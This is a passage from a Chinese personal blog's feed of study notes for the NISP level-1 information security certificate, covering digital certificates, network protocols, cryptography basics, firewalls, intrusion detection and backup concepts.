title="image-20220324202826006"><p>CA机构的数字签名内容是什么呢？就是ethanyi的公钥数据和身份信息（也就是前两点）</p><p>所以数字证书就是文件和数字签名的组合体。</p><p>同时每个人的电脑上都是有一个叫做根证书的东西，这个东西是每一次预先装好电脑之后就有的。根证书里面是有着CA机构的公钥。可以解开CA机构的数字签名</p><img src="/2022/03/24/021%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/image-20220324202859306.png" class title="image-20220324202859306"><p>那么别人怎么知道我真的是我自己呢？</p><p>假如我想要联系的对象叫做DUCK，我把我的文件发给DUCK，那么DUCK要这么知道这个文件是我给她的呢？</p><p>首先我们要知道以下几点：</p><ol><li>网上会有很多很多的数字证书（或者当DUCK收到这个文件的时候也会同时收到ethanyi的数字证书）</li><li>DUCK使用电脑中一直有的CA机构的公钥（根证书）对数字证书进行解密，解密出来的就是Ethanyi的公钥数据和身份信息的Hash值</li></ol><img src="/2022/03/24/021%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/image-20220324202931034.png" class title="image-20220324202931034"><ol start="3"><li>DUCK继续对数字证书中的另外两项进行Hash运算，算出来的结果上一步的Hash值是一样的，就证明了两次算出来的ethanyi的身份信息是一样的，证明ethanyi就是ethanyi</li></ol><img src="/2022/03/24/021%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/image-20220324202943714.png" class title="image-20220324202943714"><ol start="4"><li>那么DUCK就可以相信这个文件就是ethanyi给她的了。</li></ol><p>参考视频：</p><p><a href="https://www.bilibili.com/video/BV18N411X7ty?spm_id_from=333.1007.top_right_bar_window_history.content.click">https://www.bilibili.com/video/BV18N411X7ty?spm_id_from=333.1007.top_right_bar_window_history.content.click</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;数字证书真的是让我从学习密码学开始就一直没弄懂过，非常的痛苦，因为它是个套娃理论。我的脑子又是真的对于套娃非常地接受不了。所以说还是写一些东西进行弥补一下。这篇文章就按我自己的理论来写了。&lt;/p&gt;
&lt;p&gt;当你在网络环境中时，面对着和别的电脑的交流，特别是和可信任的电脑交流的</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="学习笔记" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="密码学" scheme="https://thanyi.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>nisp 重点错题回顾</title>
    <link href="https://thanyi.github.io/2022/03/24/020nisp-%E9%87%8D%E7%82%B9%E9%94%99%E9%A2%98%E5%9B%9E%E9%A1%BE/"/>
    <id>https://thanyi.github.io/2022/03/24/020nisp-%E9%87%8D%E7%82%B9%E9%94%99%E9%A2%98%E5%9B%9E%E9%A1%BE/</id>
    <published>2022-03-24T07:49:11.000Z</published>
    <updated>2022-05-02T16:00:02.424Z</updated>
    
    <content type="html"><![CDATA[<p>刚刚去试了一下nisp的模拟考试（nisp一级不好意思），还是有一些错题，这里来回顾一下</p><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>基础的作用有：</p><ul><li>控制：在不同安全域上的网络连接点上布置一个安全控制点，进行进出数据的限制</li><li>隔离：可信任和不可信任的网络进行隔离</li><li>记录：对进出数据进行检查记录</li></ul><p>功能包括：</p><p>包过滤：作用在网络层</p><p>审计与报警、远程管理、网络地址转换、代理、MAC地址和IP地址绑定、流量控制、统计分析和计费</p><h4 id="防火墙的代理问题"><a href="#防火墙的代理问题" class="headerlink" title="防火墙的代理问题"></a>防火墙的代理问题</h4><p>现在的防火墙可以布置在七层模型中任意的一层</p><img src="/2022/03/24/020nisp-%E9%87%8D%E7%82%B9%E9%94%99%E9%A2%98%E5%9B%9E%E9%A1%BE/image-20220324155337445.png" class title="image-20220324155337445"><p>防火墙的代理总共有两个模式：</p><ul><li>透明代理：指内部主机连接外部主机的时候，完全感觉不到有防火墙的存在。防火墙相当于网桥</li><li>传统代理：需要在客户端设置代理服务器，也就是防火墙现在像是一个代理服务器，进行NAT之类的服务。</li></ul><h1 id="信息系统安全保障"><a href="#信息系统安全保障" class="headerlink" title="信息系统安全保障"></a>信息系统安全保障</h1><p>蕴含了</p><ul><li>生命周期</li><li>保障要素</li><li>安全特性</li></ul><p>三个方面</p><h1 id="密码学研究的基石"><a href="#密码学研究的基石" class="headerlink" title="密码学研究的基石"></a>密码学研究的基石</h1><p>1949年香农发表《保密系统的信息理论》</p><h1 id="ISO-OSI安全体系"><a href="#ISO-OSI安全体系" class="headerlink" title="ISO/OSI安全体系"></a>ISO/OSI安全体系</h1><p>提供了五种服务，分别是：</p><ul><li>认证安全服务</li><li>访问控制安全服务</li><li>数据保密性安全服务</li><li>数据完整性安全服务</li><li>防抵赖服务</li></ul><h1 id="计算机系统安全保护能力"><a href="#计算机系统安全保护能力" class="headerlink" title="计算机系统安全保护能力"></a>计算机系统安全保护能力</h1><p>分为五个层级，安全等级由低到高分别是</p><ol><li>用户自主保护级</li><li>系统审计保护级</li><li>安全标记保护级</li><li>结构化保护级</li><li>访问验证保护级</li></ol><h1 id="访问控制的应用"><a href="#访问控制的应用" class="headerlink" title="访问控制的应用"></a>访问控制的应用</h1><p>入网访问控制、网络权限限制、目录级安全控制、属性安全控制、网络服务器安全控制、网络检测和锁定控制、网络端口和节点的安全控制、防火墙控制等等</p><h3 id="网络权限控制"><a href="#网络权限控制" class="headerlink" title="网络权限控制"></a>网络权限控制</h3><p>是一种防止网络非法操作而采取的安全保护措施。</p><p>用户对网络资源的访问权限通常用一个<strong>访问控制表</strong>来描述</p><h3 id="目录级安全控制"><a href="#目录级安全控制" class="headerlink" title="目录级安全控制"></a>目录级安全控制</h3><p>控制用户对目录、文件和设备的访问，或者是指定对目录及目录一下的的子目录和文件的使用权限。</p><p>注：感觉就是linux里面的文件权限啊</p><h3 id="网络服务器安全控制"><a href="#网络服务器安全控制" class="headerlink" title="网络服务器安全控制"></a>网络服务器安全控制</h3><p>允许通过服务器控制台执行的安全控制操作。</p><p>包括：用户利用控制台装载和卸载模块、安装和删除软件。</p><h3 id="从用户的角度"><a href="#从用户的角度" class="headerlink" title="从用户的角度"></a>从用户的角度</h3><p>网络的权限控制分为<strong>三</strong>类用户：</p><ul><li>特殊用户：具有系统管理权限的管理员等</li><li>一般用户：系统管理员根据实际需要而分配到一定权限的用户</li><li>审计用户：负责<strong>审计网络安全控制</strong>和<strong>资源使用情况</strong>的用户</li></ul><p>注：感觉也没有见过第三类的用户啊？单独负责审计和资源使用情况的用户？看看后面有没有机会见到吧</p><h1 id="信息安全"><a href="#信息安全" class="headerlink" title="信息安全"></a>信息安全</h1><h2 id="完整性保护"><a href="#完整性保护" class="headerlink" title="完整性保护"></a>完整性保护</h2><p>主要是防篡改、防删除、防插入</p><h2 id="安全管理"><a href="#安全管理" class="headerlink" title="安全管理"></a>安全管理</h2><h3 id="风险管理"><a href="#风险管理" class="headerlink" title="风险管理"></a>风险管理</h3><p>信息安全管理的核心在于风险管理</p><p>包括风险评估、风险消减、风险控制</p><h3 id="安全事件处理"><a href="#安全事件处理" class="headerlink" title="安全事件处理"></a>安全事件处理</h3><p>分为五个阶段：</p><p>准备阶段、检测阶段、抑制阶段、根除阶段、恢复阶段</p><h3 id="资产管理"><a href="#资产管理" class="headerlink" title="资产管理"></a>资产管理</h3><p>当公司人员想要进行敏感数据清除时正确的做法是：</p><p><strong>使用彻底清除软件进行磁盘擦除</strong></p><h1 id="公钥基础设施"><a href="#公钥基础设施" class="headerlink" title="公钥基础设施"></a>公钥基础设施</h1><p>公钥基础设施（Public Key Infrastructure）简称PKI ，是一个公钥管理平台，能够为所有的网络应用提供加密和数字签名等服务所需要的<strong>密钥</strong>和<strong>证书管理体系</strong></p><p>说是这么说，它自称是个什么什么<strong>设施</strong>，但其实说白了他是一个<strong>机制</strong></p><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><ul><li>X.509格式的证书和证书废止列表</li><li>证书授权中心（Certificate Authority）操作协议</li><li>CA管理协议</li><li>CA政策制定</li></ul><h4 id="管理对象"><a href="#管理对象" class="headerlink" title="管理对象"></a>管理对象</h4><p>证书、密钥、证书撤销</p><h1 id="数字版权管理"><a href="#数字版权管理" class="headerlink" title="数字版权管理"></a>数字版权管理</h1><p>Digital Right Management 功能有：</p><ul><li>数字媒体加密</li><li>阻止非法数字内容注册</li><li>用户行为监控</li></ul><h1 id="第二层隧道协议"><a href="#第二层隧道协议" class="headerlink" title="第二层隧道协议"></a>第二层隧道协议</h1><ul><li>PPTP：(point to point neling protocol) 点对点隧道协议</li><li>L2F：（Layer 2 forwarding）二层转发协议</li><li>L2TP：这个协议结合了前两个协议的优点，已经是二次隧道协议的工业标准</li></ul><h1 id="VPN的核心技术"><a href="#VPN的核心技术" class="headerlink" title="VPN的核心技术"></a>VPN的核心技术</h1><ul><li>隧道技术</li><li>身份认证</li><li>访问控制</li></ul><h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p>一个对称DES加密系统，使用一个集中式的专钥密码功能，核心是KDC</p><h1 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h1><p>感觉宏病毒主要就是指一些Office相关文档里面的病毒，针对这些病毒把它叫做“宏病毒”</p><p>一旦打开带有宏病毒的文档，宏就会被执行，宏病毒就会被激活，转移到计算机上，驻留在Normal模板上。在此之后所有自动保存的文档都会“感染”上这种宏病毒，如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;刚刚去试了一下nisp的模拟考试（nisp一级不好意思），还是有一些错题，这里来回顾一下&lt;/p&gt;
&lt;h1 id=&quot;防火墙&quot;&gt;&lt;a href=&quot;#防火墙&quot; class=&quot;headerlink&quot; title=&quot;防火墙&quot;&gt;&lt;/a&gt;防火墙&lt;/h1&gt;&lt;p&gt;基础的作用有：&lt;/p&gt;
&lt;u</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="nisp" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/nisp/"/>
    
    
    <category term="nisp" scheme="https://thanyi.github.io/tags/nisp/"/>
    
  </entry>
  
  <entry>
    <title>nisp 一级证书笔记</title>
    <link href="https://thanyi.github.io/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/"/>
    <id>https://thanyi.github.io/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/</id>
    <published>2022-03-21T07:09:32.000Z</published>
    <updated>2022-05-02T16:04:20.939Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、信息安全"><a href="#一、信息安全" class="headerlink" title="一、信息安全"></a>一、信息安全</h1><h2 id="基本目标"><a href="#基本目标" class="headerlink" title="基本目标"></a>基本目标</h2><h4 id="基本属性（CIA）"><a href="#基本属性（CIA）" class="headerlink" title="基本属性（CIA）"></a>基本属性（CIA）</h4><p>机密性、完整性、可用性</p><h4 id="其他属性"><a href="#其他属性" class="headerlink" title="其他属性"></a>其他属性</h4><p>真实性、可问责性、不可否认性、可靠性</p><h2 id="病毒和木马"><a href="#病毒和木马" class="headerlink" title="病毒和木马"></a>病毒和木马</h2><p>区别</p><ul><li>病毒和木马不容易区分清楚；</li><li>病毒和木马一般可以统称为恶意程序或恶意软件；</li><li>病毒具有一定的显性破坏性，木马更倾向于默默地窃取；</li><li>病毒具有自传播性，即能够自我复制，而木马则不具备这一点</li></ul><h4 id="冲击波蠕虫利用的是"><a href="#冲击波蠕虫利用的是" class="headerlink" title="冲击波蠕虫利用的是"></a>冲击波蠕虫利用的是</h4><p>DCOM RPC缓冲区漏洞</p><h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><h4 id="风险评估的方法"><a href="#风险评估的方法" class="headerlink" title="风险评估的方法"></a>风险评估的方法</h4><ul><li><p>定量的风险评估方法</p></li><li><p>定性的风险评估方法</p></li><li><p>定性与定量相结合的评估方法</p></li></ul><h1 id="二、TCP-IP协议簇"><a href="#二、TCP-IP协议簇" class="headerlink" title="二、TCP/IP协议簇"></a>二、TCP/IP协议簇</h1><p>OSI7层模型和TCP/IP五层模型</p><p>区别主要在于是五层模型的应用层变成了应用层、表示层和会话层</p><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220320213818598-16478781450921.png" class title="image-20220320213818598"><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220320214010539-16478781450922.png" class title="image-20220320214010539"><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220320214140232-16478781450923.png" class title="image-20220320214140232"><h3 id="硬件配置"><a href="#硬件配置" class="headerlink" title="硬件配置"></a>硬件配置</h3><h4 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h4><p>处于物理层</p><h4 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h4><p>物理层和数据链路层，英文简称叫做NIC卡 (Network Interface Controller)</p><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/format,f_jpg.jpeg" class title="网卡"><h3 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h3><ul><li>传输层叫做段(segment)</li><li>在网络层叫做数据报 (datagram)</li><li>在链路层叫做帧(frame)</li><li>物理层叫做bit</li></ul><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="BGP协议"><a href="#BGP协议" class="headerlink" title="BGP协议"></a>BGP协议</h3><p>Border Gateway Protocol 是一个应用层协议，运行在<strong>TCP协议</strong>之上，端口号<strong>179</strong></p><ul><li>BGP协议是用于自治系统AS之间的动态路由协议</li><li>是一种外部网关协议，与OSPF、RIP等内部网关协议不同，其着眼点不在于发现和计算路由，而是着眼于在AS之间控制路由的转播和选择最佳路由</li></ul><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220320215000304-16478781450924.png" class title="image-20220320215000304"><h3 id="邮件相关协议"><a href="#邮件相关协议" class="headerlink" title="邮件相关协议"></a>邮件相关协议</h3><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220324114933012.png" class title="image-20220324114933012"><h4 id="POP3和IMAP协议："><a href="#POP3和IMAP协议：" class="headerlink" title="POP3和IMAP协议："></a>POP3和IMAP协议：</h4><p>POP3和IMAP协议都是<strong>邮件接收协议</strong>，也就是属于 “拉” 的协议</p><ol><li><p>POP服务器侦听端口110，而带SSL安全（POP3DS）服务器的POP在端口995上侦听；</p><p>IMAP服务器侦听端口143，带有SSL安全（IMAPDS）服务器的IMAP侦听端口993。</p></li><li><p>POP3将邮件从服务器下载到单台计算机，然后将其从服务器删除。</p><p>而 IMAP 则可以通过在邮件客户端和邮箱服务器之间进行双向同步的功能来避免这种情况</p></li></ol><h4 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h4><p>SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议，是<strong>邮件发送协议</strong>，一个只能用来发送的协议</p><p>SMTP是建立在<strong>FTP文件传输服务</strong>上的一种邮件服务，端口号是25</p><h3 id="FTP协议"><a href="#FTP协议" class="headerlink" title="FTP协议"></a>FTP协议</h3><ul><li><p>FTP是仅基于TCP的服务，不支持UDP</p></li><li><p>与众不同的是FTP使用2个端口，一个数据端口和一个命令端口（也可叫做控制端口）</p><p>通常来说这两个端口是21（<strong>命令端口</strong>）和20（<strong>数据端口</strong>）</p></li><li><p>FTP具有两种模式，分别是port模式(主动模式)和pasv模式(被动模式)</p></li><li><p>FTP的传输有 ASCII 传输模式、二进制数据传输模式</p></li></ul><h3 id="Http协议"><a href="#Http协议" class="headerlink" title="Http协议"></a>Http协议</h3><p>当访问Web网站的某个页面资源不存在时，HTTP服务器发回的响应状态代码  404</p><h4 id="HTTP服务器的状态码"><a href="#HTTP服务器的状态码" class="headerlink" title="HTTP服务器的状态码"></a>HTTP服务器的状态码</h4><ul><li><p>1XX：临时的响应。客户端在收到常规响应之前，应准备接收一个或多个1XX响应</p></li><li><p>2XX：服务器成功的接收了客户端请求</p></li><li><p>3XX：客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同页面，或者通过代理服务器重复该请求</p></li><li><p>4XX：发生错误，客户端似乎有问题。例如：客户端请求不存在的页面，客户端未提供有效的身份验证信息</p></li><li><p>5XX：服务器遇到错误而不能完成该请求</p></li></ul><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><ul><li>ICMP封装在IP数据报的数据部分</li><li>ICMP消息的传输是不可靠的</li><li>ICMP是IP协议的必需的一个部分</li><li>ICMP可用来进行拥塞控制</li></ul><h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p>IP和IPsec都是工作在网络层</p><h4 id="关于IPv4地址"><a href="#关于IPv4地址" class="headerlink" title="关于IPv4地址"></a>关于IPv4地址</h4><ul><li>IP地址的总长度为32位</li><li>每一个IP地址都由网络地址和主机地址组成</li><li>一个C类地址拥有8位主机地址，可给254台主机分配地址</li></ul><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220309183802930-16478781450925.png" class title="image-20220309183802930"><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220309184416729-16478781450926.png" class title="image-20220309184416729"><h4 id="关于ipv6地址"><a href="#关于ipv6地址" class="headerlink" title="关于ipv6地址"></a>关于ipv6地址</h4><p>IPV4的32位地址共40多亿个，IPV6的128位地址是IPV4地址总数的2^96^倍</p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>WLAN和局域网是在网络层之下进行了区别，但是在网络层之上是一样的</p><h3 id="PPP-协议"><a href="#PPP-协议" class="headerlink" title="PPP 协议"></a>PPP 协议</h3><p>PPP（点到点协议）是为在同等单元之间传输数据包这样的简单链路设计的一个协议</p><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>Address Resolution Protocol  (地址解析协议)</p><p>ARP协议是在数据链路层进行确定MAC地址确定的协议，作用是可以进行IP地址和Mac地址的对应，这样就可以进行数据包的发送了。</p><ol><li>通过广播的方式对其他主机，寻求ip为xxxx的主机的Mac地址</li><li>每一个接收到广播的数据包的主机进行ip地址对应，然后发送回包。</li></ol><p>重点：</p><ul><li>ARP表用于建立IP地址到MAC地址的映射</li><li>受到了ARP欺骗的计算机发出的数据包目的MAC地址是错误的</li><li>需要对IP地址和物理地址进行缓存</li></ul><h1 id="三、密码学"><a href="#三、密码学" class="headerlink" title="三、密码学"></a>三、密码学</h1><h2 id="密码学的安全目标的三个方面："><a href="#密码学的安全目标的三个方面：" class="headerlink" title="密码学的安全目标的三个方面："></a>密码学的安全目标的三个方面：</h2><p>保密性、完整性、可用性</p><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h4 id="代换密码（substitution-cipher"><a href="#代换密码（substitution-cipher" class="headerlink" title="代换密码（substitution cipher)"></a>代换密码（substitution cipher)</h4><p>就是明文中的每一个字符被替换成密文中的另一个字符。接收者对密文做反向替换就可以恢复出明文。  </p><h4 id="置换密码-permutation-cipher"><a href="#置换密码-permutation-cipher" class="headerlink" title="置换密码 ( permutation cipher)"></a>置换密码 ( permutation cipher)</h4><p>又称换位密码（transposition cipher)：明文的字母保持相同，但顺序被打乱了。</p><h2 id="序列密码算法"><a href="#序列密码算法" class="headerlink" title="序列密码算法"></a>序列密码算法</h2><p>RC4、A5/1、SEAL等；</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>wifi的加密方式有<strong>WEP</strong>，<strong>CCMP</strong>，<strong>AES</strong>和<strong>TKIP</strong></p><p>WEP加密是共享秘钥式，使用了<strong>RC4</strong>进行加密算法，规定的密钥长度是<strong>64bit</strong></p><h4 id="关于序列密码"><a href="#关于序列密码" class="headerlink" title="关于序列密码"></a>关于序列密码</h4><ul><li><p>序列密码是单独地加密每个明文位；</p></li><li><p>由于序列密码小而快，所以它们非常合适计算资源有限的应用；</p></li><li><p>序列密码的加密和解密使用相同的函数；</p></li></ul><h2 id="分组密码算法"><a href="#分组密码算法" class="headerlink" title="分组密码算法"></a>分组密码算法</h2><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><ul><li>DES 是一种分组密码</li><li>DES 是对合运算,因而加密和解密共同一算法</li><li>DES 综合运用了置换、代替、代数等多种密码技术</li><li>DES ==不是==面向十六进制的密码算法</li></ul><h4 id="DES的缺点"><a href="#DES的缺点" class="headerlink" title="DES的缺点"></a>DES的缺点</h4><ul><li>密钥较短</li><li>存在弱密钥</li><li>存在半弱密钥</li></ul><h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><h2 id="公开密码机制（非对称加密机制）"><a href="#公开密码机制（非对称加密机制）" class="headerlink" title="公开密码机制（非对称加密机制）"></a>公开密码机制（非对称加密机制）</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><ul><li>RSA 算法具有加解密算法的可逆性,加密和解密运算可交换</li><li>RSA 密码的核心运算是模幂运算</li><li>RSA 算法可同时确保数据的秘密性和数据的真实性</li></ul><h2 id="Hash算法"><a href="#Hash算法" class="headerlink" title="Hash算法"></a>Hash算法</h2><ul><li>安全散列算法是 FIPS 所认证的安全杂凑算法</li><li>安全哈希算法主要适用于数字签名标准里面定义的数字签名算法</li><li>哈希算法输出的字符串一般称为 Hash 值</li></ul><h2 id="密码应用"><a href="#密码应用" class="headerlink" title="密码应用"></a>密码应用</h2><h3 id="CFS"><a href="#CFS" class="headerlink" title="CFS"></a>CFS</h3><p>CFS是一个经典的加密文件系统</p><ul><li>CFS使用DES来加密文件</li><li>CFS客户基于网络文件系统协议运行一个服务器保护程序</li><li>CFS的加密操作在用户层完成</li><li>CFS的效率<strong>不</strong>高</li></ul><h3 id="TCFS"><a href="#TCFS" class="headerlink" title="TCFS"></a>TCFS</h3><p>TCFS是一个受CFS启发的Linux软件包</p><ul><li><p>TCFS具有更大的透明度，用户甚至不需要知道他们的文件被加密了</p></li><li><p>TCFS对数据进行加密时，对每个文件使用不同的“文件密钥”进行加密</p><p>对一个文件的不同部分使用的是不同的“块密钥”进行加密</p></li><li><p>TCFS的数据加密、解密操作在核心层完成</p></li><li><p>TCFS对文件名、文件大小、访问时间、目录结构等一些敏感信息==没有==很好的保护</p></li></ul><h1 id="四、安全技术"><a href="#四、安全技术" class="headerlink" title="四、安全技术"></a>四、安全技术</h1><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li><p>防火墙阻挡对网络的非法访问和不安全数据的传递</p></li><li><p>防火墙的安全规则由匹配条件与处理方式两个部分共同构成</p></li><li><p>防火墙使得本地系统和网络免于受到许多网络安全威胁</p></li><li><p>防火墙==不是==一种动态安全技术</p></li></ul><h3 id="经典体系结构"><a href="#经典体系结构" class="headerlink" title="经典体系结构"></a>经典体系结构</h3><ul><li>双重宿主主机体系结构 </li><li>被屏蔽主机体系结构 </li><li>被屏蔽子网体系结构</li></ul><p>下一代防火墙</p><p>不基于互联网及用户自身的动态策略配置</p><h3 id="处置响应的配置接口"><a href="#处置响应的配置接口" class="headerlink" title="处置响应的配置接口"></a>处置响应的配置接口</h3><ul><li>处置IOC</li><li>处置受害IP</li><li>事件告警</li></ul><h3 id="显著的缺点"><a href="#显著的缺点" class="headerlink" title="显著的缺点"></a>显著的缺点</h3><p>就是防火墙对于应用层没有控制,方便了木马的进入    </p><h2 id="网络蜜罐技术"><a href="#网络蜜罐技术" class="headerlink" title="网络蜜罐技术"></a>网络蜜罐技术</h2><h3 id="最主要的功能"><a href="#最主要的功能" class="headerlink" title="最主要的功能"></a>最主要的功能</h3><ul><li>对系统中所有的操作</li><li>行为进行监视和记录</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>产品型和研究型</p><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>在受防火墙保护的网络中,蜜罐通常放置在防火墙的外部或放置在防护程度较低的服务网络中</p><h2 id="容灾系统"><a href="#容灾系统" class="headerlink" title="容灾系统"></a>容灾系统</h2><p>衡量容灾系统有两个主要指标：</p><p>RPO（Recovery Point Objective）和 RTO（Recovery Time Object）</p><p>其中 RPO代表 了当灾难发生时允许丢失的数据量，而 RTO 则代表了系统恢复的时间。 <strong>RPO 与 RTO 越小，系统的可用性就越高</strong>，当然用户需要的投资也越大。</p><h4 id="容灾技术范畴"><a href="#容灾技术范畴" class="headerlink" title="容灾技术范畴"></a>容灾技术范畴</h4><p>数据容灾、系统容灾、应用容灾</p><h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><h4 id="完全备份"><a href="#完全备份" class="headerlink" title="完全备份"></a>完全备份</h4><p>完全备份是指将系统中所有选择的数据对象进行一次全面的备份，不论数据对象自上次备份之后是否修改过</p><h4 id="增量备份"><a href="#增量备份" class="headerlink" title="增量备份"></a>增量备份</h4><p>增量备份是指只对上次备份后系统中变化过的数据对象的备份</p><h4 id="差分备份"><a href="#差分备份" class="headerlink" title="差分备份"></a>差分备份</h4><p>差异备份是指在==<strong>一次全备份</strong>==后到进行差异备份的这段时间内，对那些增加或者修改文件的备份</p><h4 id="渐进式备份"><a href="#渐进式备份" class="headerlink" title="渐进式备份"></a>渐进式备份</h4><p>系统排除完全备份，数据对象只有当发生改变时才被写入到存储介质上</p><h2 id="入侵防御系统（IPS"><a href="#入侵防御系统（IPS" class="headerlink" title="入侵防御系统（IPS)"></a>入侵防御系统（IPS)</h2><p>入侵防御系统（IPS）不但能精确地检测到攻击行为，而且能通过一定的响应方式实时地终止入侵行为的发生</p><h3 id="Web应用防护系统（WAF）"><a href="#Web应用防护系统（WAF）" class="headerlink" title="Web应用防护系统（WAF）"></a>Web应用防护系统（WAF）</h3><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220321101338773.png" class title="image-20220321101338773"><p>网站应用级入侵防御系统  （Web Application Firewall），简称： WAF</p><p>Web应用防火墙可以防止Web应用免受各种常见攻击，比如SQL注入，跨站脚本漏洞（XSS）等。</p><h4 id="部署方式"><a href="#部署方式" class="headerlink" title="部署方式"></a>部署方式</h4><ul><li><strong>透明代理模式</strong></li><li><strong>反向代理模式</strong></li><li><strong>路由代理模式</strong></li></ul><h2 id="入侵检测系统（IDS）"><a href="#入侵检测系统（IDS）" class="headerlink" title="入侵检测系统（IDS）"></a>入侵检测系统（IDS）</h2><p>依照一定的安全策略，对网络、系统的运行状况进行监视，其全称为</p><p>Intrusion Detection Systems</p><h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><h3 id="数据源分类"><a href="#数据源分类" class="headerlink" title="数据源分类"></a>数据源分类</h3><ul><li><p>基于主机的入侵检测系统（HIDS）</p></li><li><p>基于网络的入侵检测系统（NIDS）</p></li></ul><h3 id="检测原理分类"><a href="#检测原理分类" class="headerlink" title="检测原理分类"></a>检测原理分类</h3><ul><li><h4 id="异常入侵检测"><a href="#异常入侵检测" class="headerlink" title="异常入侵检测"></a>异常入侵检测</h4></li><li><h4 id="特征入侵检测"><a href="#特征入侵检测" class="headerlink" title="特征入侵检测"></a>特征入侵检测</h4></li></ul><h2 id="入侵检测技术"><a href="#入侵检测技术" class="headerlink" title="入侵检测技术"></a>入侵检测技术</h2><h4 id="误用检测技术（特征检测技术）"><a href="#误用检测技术（特征检测技术）" class="headerlink" title="误用检测技术（特征检测技术）"></a><strong>误用检测技术（特征检测技术）</strong></h4><p>收集非正常操作的行为特征，建立相关的特征库，当监测的用户或系统行为与库中的记录相匹配时，系统就认为这种行为是入侵。</p><p>总结：收集的是攻击特征</p><h4 id="异常检测技术"><a href="#异常检测技术" class="headerlink" title="异常检测技术"></a><strong>异常检测技术</strong></h4><p>首先总结正常操作应该具有的特征（用户轮廓），试图用定量的方式加以描述，当用户活动与正常行为有重大偏离时即被认为是入侵。</p><p>总结：收集的是正常特征</p><h1 id="五、网络空间安全保障和安全运维"><a href="#五、网络空间安全保障和安全运维" class="headerlink" title="五、网络空间安全保障和安全运维"></a>五、网络空间安全保障和安全运维</h1><h2 id="系统安全模型"><a href="#系统安全模型" class="headerlink" title="系统安全模型"></a>系统安全模型</h2><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220310094306342-16478781450927.png" class title="image-20220310094306342"><h4 id="四种强制访问控制策略规定："><a href="#四种强制访问控制策略规定：" class="headerlink" title="四种强制访问控制策略规定："></a><strong>四种强制访问控制策略规定</strong>：</h4><p>下读、上写、上读、下写</p><p>其中上读：</p><p>是指客体在主体之上时可以进行读取</p><h4 id="Lattice模型"><a href="#Lattice模型" class="headerlink" title="Lattice模型"></a>Lattice模型</h4><p>下读、下写</p><p>只有主体安全级别大于客体才能读写</p><h4 